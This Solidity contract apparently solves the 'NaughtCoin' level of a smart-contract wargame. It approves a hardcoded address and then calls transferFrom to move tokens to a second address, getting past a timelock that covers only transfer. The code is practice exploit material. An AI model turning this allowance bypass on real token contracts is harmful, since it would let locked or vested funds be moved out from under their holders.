// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

import './NaughtCoin.sol';

contract ExoFifteen{
    NaughtCoin naughtCoin;
    uint256 public amount;

    constructor(address _address) {
        naughtCoin = NaughtCoin(_address);
        amount  = naughtCoin.INITIAL_SUPPLY();
    }

    function approve() public {
        naughtCoin.approve(payable(0xf63C073Fb0A9aeb8C708dEe86A6Eb0ac0c7A9886), amount);
    }

    function execute(uint256 _amount) public {
        // ERC20.transfer(payable(0xa6A5C305aAE629A75a10aCE47C65E035d26D5226), amount);
        naughtCoin.transferFrom(payable(0xf63C073Fb0A9aeb8C708dEe86A6Eb0ac0c7A9886), payable(0xa6A5C305aAE629A75a10aCE47C65E035d26D5226), _amount);
    }

}